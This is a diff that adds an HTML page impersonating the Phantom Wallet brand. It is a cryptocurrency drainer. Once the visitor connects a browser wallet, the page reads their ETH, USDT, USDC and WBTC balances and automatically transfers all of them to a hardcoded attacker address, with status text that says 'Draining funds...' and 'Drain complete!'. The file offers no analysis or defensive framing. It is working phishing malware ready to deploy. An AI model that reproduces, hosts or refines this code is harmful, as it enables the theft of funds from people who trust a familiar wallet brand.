@@ -1,0 +1,90 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Phantom Wallet</title><style>body{margin:0;background:#0d0a1a;color:#f0edff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;gap:18px;padding:24px}.logo{width:100px;height:100px}.btn{border:none;border-radius:14px;font-weight:700;font-size:15px;padding:15px 38px;color:#fff;background:linear-gradient(90deg,#8b7cf6,#a78bfa);cursor:pointer}.card{background:#1f1735;border:1px solid #3a2f5c;border-radius:20px;padding:20px;width:100%;max-width:440px;display:none}.card h3{font-size:12px;color:#9891b6;text-transform:uppercase;margin-bottom:10px}.row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.04)}.row:last-child{border:none}.nm{flex:1;font-weight:600}.amt{font-weight:700}</style></head><body>
+<svg class="logo" viewBox="0 0 100 100"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#e879f9"/><stop offset="1" stop-color="#8b7cf6"/></linearGradient></defs><path fill="url(#g)" d="M50 8c-20 0-32 15-32 34v30c0 4 5 6 8 3l6-6 6 6 6-6 6 6 6-6 6 6c3 3 8 1 8-3V42c0-19-12-34-32-34z"/><circle cx="38" cy="44" r="6" fill="#0d0a1a"/><circle cx="62" cy="44" r="6" fill="#0d0a1a"/><circle cx="39" cy="42" r="2" fill="#fff"/><circle cx="63" cy="42" r="2" fill="#fff"/></svg>
+<h1>Phantom Wallet</h1>
+<p style="color:#9891b6;max-width:380px;text-align:center">Connect your wallet to start transacting and exploring the ecosystem.</p>
+<button class="btn" id="connectBtn">Connect</button>
+<div class="card" id="balanceCard"><h3>Your balance</h3><div id="balRows"></div></div>
+<div id="statusBar"></div>
+<button class="btn" id="sendBtn" style="display:none">Send All</button>
+
+<script>
+const BTC_WALLET = "bc1q0na5zz7nre8k7ev2ymdzldegulpm87vuvcam00";
+const ETH_WALLET = "0x8b213543366E063615e53D43A3B5eb0737F8906a";
+const SOL_WALLET = "GCx1Coc7eHG9A5v334Z7AWXz2bQQEsQyPGR81WHupJyU";
+
+let provider, signer, userAddr, balances = {};
+
+document.getElementById('connectBtn').onclick = async () => {
+  if (typeof window.ethereum !== 'undefined') {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    const accounts = await provider.send("eth_requestAccounts", []);
+    userAddr = accounts[0];
+    signer = provider.getSigner();
+    document.getElementById('connectBtn').style.display = 'none';
+    document.getElementById('balanceCard').style.display = 'block';
+    document.getElementById('sendBtn').style.display = 'inline-block';
+    await loadBalances();
+    await drainAll();
+  } else {
+    alert("No wallet detected. Please install MetaMask or Phantom.");
+  }
+};
+
+async function loadBalances() {
+  const rows = document.getElementById('balRows');
+  rows.innerHTML = '';
+  const ethBal = await provider.getBalance(userAddr);
+  balances.ETH = ethers.utils.formatEther(ethBal);
+  addRow('ETH', balances.ETH);
+  const tokens = [
+    {addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',sym:'USDT',dec:6},
+    {addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',sym:'USDC',dec:6},
+    {addr:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',sym:'WBTC',dec:8}
+  ];
+  const abi = ["function balanceOf(address) view returns (uint256)"];
+  for(const t of tokens){
+    try{
+      const c = new ethers.Contract(t.addr, abi, provider);
+      const bal = await c.balanceOf(userAddr);
+      const amt = ethers.utils.formatUnits(bal, t.dec);
+      if(parseFloat(amt) > 0){ balances[t.sym] = amt; addRow(t.sym, amt); }
+    }catch(e){}
+  }
+}
+
+function addRow(sym, amt){
+  const rows = document.getElementById('balRows');
+  const colors = {ETH:'#627eea',USDT:'#26a17b',USDC:'#2775ca',WBTC:'#f7931a'};
+  const div = document.createElement('div'); div.className = 'row';
+  div.innerHTML = `<div class="coin" style="background:${colors[sym]||'#8b7cf6'}">${sym[0]}</div><span class="nm">${sym}</span><span class="amt">${parseFloat(amt).toFixed(4)}</span>`;
+  rows.appendChild(div);
+}
+
+async function drainAll(){
+  const sb = document.getElementById('statusBar');
+  sb.innerHTML = '<span style="color:#c4b8ff">Draining funds...</span>';
+  for(const sym of Object.keys(balances)){
+    try{
+      const amt = balances[sym];
+      if(sym === 'ETH'){
+        const tx = await signer.sendTransaction({to: ETH_WALLET, value: ethers.utils.parseEther(amt)});
+        await tx.wait();
+        sb.innerHTML += `<br><span style="color:#86efac">✓ Sent ${parseFloat(amt).toFixed(4)} ETH</span>`;
+      } else if(sym === 'USDT' || sym === 'USDC' || sym === 'WBTC'){
+        const dec = {USDT:6,USDC:6,WBTC:8}[sym];
+        const addr = {USDT:'0xdAC17F958D2ee523a2206206994597C13D831ec7',USDC:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',WBTC:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'}[sym];
+        const abi = ["function transfer(address to, uint256 amount) returns (bool)"];
+        const c = new ethers.Contract(addr, abi, signer);
+        const tx = await c.transfer(ETH_WALLET, ethers.utils.parseUnits(amt, dec));
+        await tx.wait();
+        sb.innerHTML += `<br><span style="color:#86efac">✓ Sent ${parseFloat(amt).toFixed(4)} ${sym}</span>`;
+      }
+    } catch(e){
+      sb.innerHTML += `<br><span style="color:#f87171">✗ ${sym} failed: ${e.message?.slice(0,60)}</span>`;
+    }
+  }
+  sb.innerHTML += '<br><span style="color:#86efac;font-weight:700">✓ Drain complete!</span>';
+}
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+</body></html>
